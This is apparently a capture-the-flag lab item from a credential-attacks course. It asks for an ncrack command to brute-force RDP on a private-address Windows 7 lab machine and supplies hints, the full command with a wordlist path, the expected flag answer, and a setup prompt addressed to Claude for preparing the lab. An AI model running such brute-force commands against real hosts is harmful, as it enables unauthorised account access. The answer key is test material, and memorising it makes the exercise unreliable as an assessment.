# Q109 — Ncrack RDP

| Field | Value |
|---|---|
| **Target** | `192.168.52.130` (Windows 7) |
| **Domain** | 05 — Credential Attacks |
| **Difficulty** | 🟡 Medium |
| **Tools** | `ncrack` |
| **Time budget** | 10–20 min |

---

## 📝 Question

Use ncrack to brute RDP on Win7. Provide command.

---

## 🎯 Flag Format

```
cmd=<short>
```

Example: `cmd=ncrack -vv --user Administrator -P pass.txt rdp://192.168.52.130`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`ncrack` good for RDP/SSH.
</details>

<details>
<summary>Hint 2</summary>

Slower than hydra in some cases.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
ncrack -vv --user Administrator -P /usr/share/wordlists/fasttrack.txt rdp://192.168.52.130
```

Tests creds; slow due to RDP timing.

**Answer:** `cmd=ncrack --user Administrator -P pass.txt rdp://192.168.52.130`

📖 Ref: [tools/hydra.md](../../tools/hydra.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q109:
1. Verify Win7 up; RDP enabled on 3389 (see Q063 steps).
2. On Parrot: which ncrack (sudo apt install ncrack).
3. Set Administrator pwd to a wordlist entry for lab success.

Report back: "Lab ready for Q109 — Win7 RDP 3389 open, ncrack + fasttrack ready".
```
